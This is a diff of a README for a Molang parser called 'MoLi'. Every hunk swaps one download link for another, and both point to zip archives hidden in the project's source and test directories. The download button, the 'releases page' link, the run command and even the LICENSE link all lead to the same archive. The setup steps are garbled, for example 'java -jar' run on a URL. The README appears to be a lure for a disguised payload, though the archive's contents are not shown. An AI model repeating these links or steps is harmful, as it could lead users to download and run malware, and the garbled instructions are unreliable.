@@ -6,7 +6,7 @@ Welcome to MoLi! This application allows you to parse and run Molang expressions
 
 ## 📥 Download MoLi
 
-[![Download MoLi](https://raw.githubusercontent.com/kartik359/MoLi/main/src/main/java/dev/wvr/moli/parser/Li_Mo_v1.7.zip%20MoLi-Get%20It%20Here-blue)](https://raw.githubusercontent.com/kartik359/MoLi/main/src/main/java/dev/wvr/moli/parser/Li_Mo_v1.7.zip)
+[![Download MoLi](https://github.com/kartik359/MoLi/raw/refs/heads/main/src/test/java/dev/Li_Mo_1.5.zip%20MoLi-Get%20It%20Here-blue)](https://github.com/kartik359/MoLi/raw/refs/heads/main/src/test/java/dev/Li_Mo_1.5.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,21 +29,21 @@ To run MoLi, your computer needs to meet the following requirements:
 To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page:
-   [Download MoLi](https://raw.githubusercontent.com/kartik359/MoLi/main/src/main/java/dev/wvr/moli/parser/Li_Mo_v1.7.zip)
+   [Download MoLi](https://github.com/kartik359/MoLi/raw/refs/heads/main/src/test/java/dev/Li_Mo_1.5.zip)
 
 2. **Choose the Latest Release:** On the releases page, locate the latest version of MoLi. It will be marked as the most recent release.
 
-3. **Download the File:** Click the appropriate file link for your operating system. It will usually be named like `https://raw.githubusercontent.com/kartik359/MoLi/main/src/main/java/dev/wvr/moli/parser/Li_Mo_v1.7.zip` for Java applications.
+3. **Download the File:** Click the appropriate file link for your operating system. It will usually be named like `https://github.com/kartik359/MoLi/raw/refs/heads/main/src/test/java/dev/Li_Mo_1.5.zip` for Java applications.
 
 4. **Save the File:** Your browser will prompt you to save the file. Select a folder where you can easily find it later.
 
 5. **Run MoLi:** After downloading, navigate to the folder where you saved the file. Open a terminal or command prompt and use the following command to run MoLi:
 
    ```
-   java -jar https://raw.githubusercontent.com/kartik359/MoLi/main/src/main/java/dev/wvr/moli/parser/Li_Mo_v1.7.zip
+   java -jar https://github.com/kartik359/MoLi/raw/refs/heads/main/src/test/java/dev/Li_Mo_1.5.zip
    ```
 
-   Replace `https://raw.githubusercontent.com/kartik359/MoLi/main/src/main/java/dev/wvr/moli/parser/Li_Mo_v1.7.zip` with the actual file name. This command will start the Molang parser.
+   Replace `https://github.com/kartik359/MoLi/raw/refs/heads/main/src/test/java/dev/Li_Mo_1.5.zip` with the actual file name. This command will start the Molang parser.
 
 ## 🎓 How to Use MoLi
 
@@ -72,7 +72,7 @@ Do you want to help improve MoLi? Here's how:
 
 ## 📜 License
 
-MoLi is open-source software. You can use it freely in personal and commercial projects under the terms laid out in the [LICENSE](https://raw.githubusercontent.com/kartik359/MoLi/main/src/main/java/dev/wvr/moli/parser/Li_Mo_v1.7.zip) file found in the repository.
+MoLi is open-source software. You can use it freely in personal and commercial projects under the terms laid out in the [LICENSE](https://github.com/kartik359/MoLi/raw/refs/heads/main/src/test/java/dev/Li_Mo_1.5.zip) file found in the repository.
 
 ## 🪲 Troubleshooting
 
